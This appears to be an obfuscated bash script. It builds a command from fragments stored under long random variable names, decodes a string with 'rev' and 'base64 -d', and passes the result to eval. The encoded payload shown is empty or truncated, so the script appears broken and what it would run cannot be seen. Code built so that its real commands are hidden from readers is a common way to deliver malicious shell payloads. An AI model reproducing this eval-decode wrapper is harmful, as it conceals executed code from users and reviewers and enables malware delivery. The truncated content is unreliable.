rVsqoACSkQdpEJbcGLuMKtnTKcmAQdWfWvvjEPklxSlBvfuddtweirAoELfWVLOLqZzGHMeBRHwvmSobFfNTWAFUtLYCDJkyxkqa="IstTHEQMCRIfRVJzxPOCTDflNYKpcppRySRtFDXvpjVapHCfEoLznHoCzRSeogYAhqHLOmBNzHxHoQfbvBFjKMGMwkEqfvMLmjPU";HWHgOodfBrNBvmybzzqiyzjQowvEUHmjKSIFqSjXkbxOBNgEATgyZxQEwjmyNznIGkPlszaROySxpoQVCpjoUYKpLWdbkSHVRyFA="HrqsPgioqDDaUAjfIjsXkPmkyPlsWMCnNbkAjOTjunsfxTgwwyBwoBZCmJstVgsmsmcmrsXCevYuQqMBQSQgIZVNxaiUjnfBAFeI";VgyTduDQfjtwidmsJoTCjcWbnFlJkAQnvHssXqfVpXaOwwLLbwfAmFbSTSiiChTchryLLPOllOsfGbTuxFVswpAaSZXXdpsMBjLc="ch";FWvboCcnKibGGRurDPnClbjNEWQaFVhNmUVdwQOtgYCFzURnJZXtLTADpxShjxVOFQwQhDxKqpMtdUSIHuplibFTLCvNxWuUzUxW="4";nkCbKXocrhBjnBaoWKQuztLraKBzpOUITDIJtJyusBxWlpZmStsujDVRiBWjJSCxHLrkJgPSoaVvJswoCZLlNmjBxNOYLCVeoXXr="";gYOOEqkvGBdCaGvyxPuUMOniiIuRQXPDkCEAByiUnJqujtfDmrMNFRYjicqddQmAIhjPwmRPzKQuTXvFoXovJKkyWkuXNyrbSnBs="idfViGMJQWVxwZFLQVVggQpXRKvfSNhCJrOggTYQUEnQXLvrdKDzFqcjKgCPFXFKQOBpQTZmdrnLMHUlgXaUFUThLxyhLgKUCkzc";XKXuKDvznrUBACJcUHAgePzENRuesdtmJfZakMvfoqahzKVAsFgNZKxcGOHpFOSRmpUMncZNCTTqKFSWzsdDbujrPYWtMnAFIkKw=" == | r";mvYdiBZsIEzHjXECtgtKKCTUiwxBfCEDQvrCOQFWIOilaFBeZdGjTfFhlYLfTXKTprQvMaWGqrLkoxWlLZBSTklkUgobaVXQVSRP="BLkbpkdjPVMZkugQtdaCsPClOJYkDRgaIIdLPlfrUHPhPGbVWnGxIwAwkNuIkhgMrVaBomwsRDtuTRscsQtyIfQewKMftCAofmyD";gFqSUfORdEyyZBxlCysRWvirIayabNGpkaoVNdBOVyYBRmKXitQKXzyQNIlednASRrCpcynBufKhKgPwVyTFmbHWtciAnLvDvXNd="";rWVeKrBCgwbnlvytuUdmCvssVAqrEXPyOCCcePFNjuSCBusoUmjlkvvzJLRFEdFMmUEFNNSpPSuqZvDDTJhfizgNvyTxUKnBwxDf="as";FiSuyfqFILHLuUTIjAAZiSXgqYGWfOyjvPOLTAFNCmNcaBPtliInXdzLOmQWvhmkpMkwuLAyJrwCLaQeleXFLmoguMvvAxJkkQue="WEJNFtDCvyqeeemtEekqpQIHpnvdWBkRzDtsUYmwIUHXdVtgCrsVHnVpnqdNJhdlZAOYKvqpSJpJTdSqXXWHpGkFueXayNjohZnK";TRGstUePhruRBPKnMobvRzOzJfQCYvgZrIeueIPJOgzAkIFtyxOvAtffhCIuRsIlxUWuCAvNWKrFrYNleHnfdlcTACEQXYUEgMTE="TDFGBVeSTtxRijHLHfNPqPWYamgzMCbRJoJerhOtdagzrYQPZbIkQJlopFfiCWeULmMintnYCbpEfSvOHnpSbFzsPWotcLCfqCSG";XvYwHfSVmXLxHGwjbGNEVtmPDvQHSNybGFPJwFzRekHOGPmDdMmsgEZhxaoCkDdHeRjFbGrnnUQaXWFNzNYqlVYGMHsvKYNjBfug="o";IJawXQZcxOCwhvwMthXzLBPorEhZNBHmBVRwnmjEnhqzcbbeyjYEVoCjGVCQIcdJHIXOESsVSUouynJnnInhDXhjJorZTJLSCEHg="6";hfNLdHlWZaOYDMsCCVojsnCQzEOvGJQPvSXkrcxAnlyaxukJZcQVvRVcoZbZOuYNWGaXHNLAVBbOGBhJgZgsOtGfdiHeBuHhpQBO="RRzMZhEKYxOlAxtyNcigMHNBPpxTXynCijgrRjQcQWwngwVFnPBYKuMyPRqbIPhsUYCUDGRzCBsGctfONfQkWugOHvgVLJMUldZZ";zZnTqbfCYKGyCYjhVHlpIobEjMwgorYGKRxduHEwTGSInCxCrRbedbdimqcUfFiNdSnZwgDPTEWhAAOOcHJMSKFtBDinBReBhKXa=" -d";xkbyYwIBCaPBUdQUWqsEtqtFuGRNnpJhyOCuklKEUMXwjeQmhzgwkHwSBUnHzvQBtAunHdSEfwJmjdifOtFFKNLTKJNATGbPwquc="FQVaFYZFAmwKJrJHlUArhtHktyWjqGKhRCCrjdsSNhRBIVUJHOlkqWzsxTHzCIOwrDuqxgbNuVJIdvKocvdevTKbNkGWRlddBfEe";KPziKvnxNcBDEqwOcbAImKnoHZMKoPfcHWgZZNYnnLoKFQccxSeWnCkAaqJJfwjfdVGwlnNfCZjwBomkNHyNnsfrhlyZHYZvQJeX="";RYjilRUzkHvfFISXwmyEOlvaRsmsXiODAHGEDXZydOYBYSaaShPglwmTjgxdrrMJDCTrbKVYLzTfkgbjVaqwCkaIDMvwSroWvCzb="b";BxkhXfQqHHXjFfAiBqCYVixvOqWLwszdFDkNTTeNIdRaMVsBUvKszuzbXVxXYHbJCBxEJFmpCqqOnQArSBGluPbbMcvkCFAmWLfD="e";pqbqInFlpTXfoJPCVFeHLfcVVyHNaKkJjHQoQZYIloPpbbmdjwAaJjbRGtgQaJBRPLrvdZuyocMkoyOrjNWmaYRCzerRUrSLVGxK="v |";Tx=Eds;hlnmefwWzTObdgcjamyOdoTalPZmuQnmdTpyVwcYzmKwXXRWVTMtVpKbNoFTyyVfhTOKajjYJfcCJcSKVGMosTzKRUEADXmzdnwP="";obMEJHdqaziYQwXVhsvXbAqRLvHcLsbASnpjQRYJBnoZeGWWSvAgPygQLlVeTskqWYkRxOYANccFPXZofodpGRzzjEQjCaivYrDV=$(eval "$gFqSUfORdEyyZBxlCysRWvirIayabNGpkaoVNdBOVyYBRmKXitQKXzyQNIlednASRrCpcynBufKhKgPwVyTFmbHWtciAnLvDvXNd$BxkhXfQqHHXjFfAiBqCYVixvOqWLwszdFDkNTTeNIdRaMVsBUvKszuzbXVxXYHbJCBxEJFmpCqqOnQArSBGluPbbMcvkCFAmWLfD$VgyTduDQfjtwidmsJoTCjcWbnFlJkAQnvHssXqfVpXaOwwLLbwfAmFbSTSiiChTchryLLPOllOsfGbTuxFVswpAaSZXXdpsMBjLc$nkCbKXocrhBjnBaoWKQuztLraKBzpOUITDIJtJyusBxWlpZmStsujDVRiBWjJSCxHLrkJgPSoaVvJswoCZLlNmjBxNOYLCVeoXXr$XvYwHfSVmXLxHGwjbGNEVtmPDvQHSNybGFPJwFzRekHOGPmDdMmsgEZhxaoCkDdHeRjFbGrnnUQaXWFNzNYqlVYGMHsvKYNjBfug$XKXuKDvznrUBACJcUHAgePzENRuesdtmJfZakMvfoqahzKVAsFgNZKxcGOHpFOSRmpUMncZNCTTqKFSWzsdDbujrPYWtMnAFIkKw$BxkhXfQqHHXjFfAiBqCYVixvOqWLwszdFDkNTTeNIdRaMVsBUvKszuzbXVxXYHbJCBxEJFmpCqqOnQArSBGluPbbMcvkCFAmWLfD$pqbqInFlpTXfoJPCVFeHLfcVVyHNaKkJjHQoQZYIloPpbbmdjwAaJjbRGtgQaJBRPLrvdZuyocMkoyOrjNWmaYRCzerRUrSLVGxK$gFqSUfORdEyyZBxlCysRWvirIayabNGpkaoVNdBOVyYBRmKXitQKXzyQNIlednASRrCpcynBufKhKgPwVyTFmbHWtciAnLvDvXNd$RYjilRUzkHvfFISXwmyEOlvaRsmsXiODAHGEDXZydOYBYSaaShPglwmTjgxdrrMJDCTrbKVYLzTfkgbjVaqwCkaIDMvwSroWvCzb$hlnmefwWzTObdgcjamyOdoTalPZmuQnmdTpyVwcYzmKwXXRWVTMtVpKbNoFTyyVfhTOKajjYJfcCJcSKVGMosTzKRUEADXmzdnwP$rWVeKrBCgwbnlvytuUdmCvssVAqrEXPyOCCcePFNjuSCBusoUmjlkvvzJLRFEdFMmUEFNNSpPSuqZvDDTJhfizgNvyTxUKnBwxDf$BxkhXfQqHHXjFfAiBqCYVixvOqWLwszdFDkNTTeNIdRaMVsBUvKszuzbXVxXYHbJCBxEJFmpCqqOnQArSBGluPbbMcvkCFAmWLfD$IJawXQZcxOCwhvwMthXzLBPorEhZNBHmBVRwnmjEnhqzcbbeyjYEVoCjGVCQIcdJHIXOESsVSUouynJnnInhDXhjJorZTJLSCEHg$nkCbKXocrhBjnBaoWKQuztLraKBzpOUITDIJtJyusBxWlpZmStsujDVRiBWjJSCxHLrkJgPSoaVvJswoCZLlNmjBxNOYLCVeoXXr$FWvboCcnKibGGRurDPnClbjNEWQaFVhNmUVdwQOtgYCFzURnJZXtLTADpxShjxVOFQwQhDxKqpMtdUSIHuplibFTLCvNxWuUzUxW$zZnTqbfCYKGyCYjhVHlpIobEjMwgorYGKRxduHEwTGSInCxCrRbedbdimqcUfFiNdSnZwgDPTEWhAAOOcHJMSKFtBDinBReBhKXa$hlnmefwWzTObdgcjamyOdoTalPZmuQnmdTpyVwcYzmKwXXRWVTMtVpKbNoFTyyVfhTOKajjYJfcCJcSKVGMosTzKRUEADXmzdnwP");eval "$KPziKvnxNcBDEqwOcbAImKnoHZMKoPfcHWgZZNYnnLoKFQccxSeWnCkAaqJJfwjfdVGwlnNfCZjwBomkNHyNnsfrhlyZHYZvQJeX$obMEJHdqaziYQwXVhsvXbAqRLvHcLsbASnpjQRYJBnoZeGWWSvAgPygQLlVeTskqWYkRxOYANccFPXZofodpGRzzjEQjCaivYrDV$gFqSUfORdEyyZBxlCysRWvirIayabNGpkaoVNdBOVyYBRmKXitQKXzyQNIlednASRrCpcynBufKhKgPwVyTFmbHWtciAnLvDvXNd$nkCbKXocrhBjnBaoWKQuztLraKBzpOUITDIJtJyusBxWlpZmStsujDVRiBWjJSCxHLrkJgPSoaVvJswoCZLlNmjBxNOYLCVeoXXr"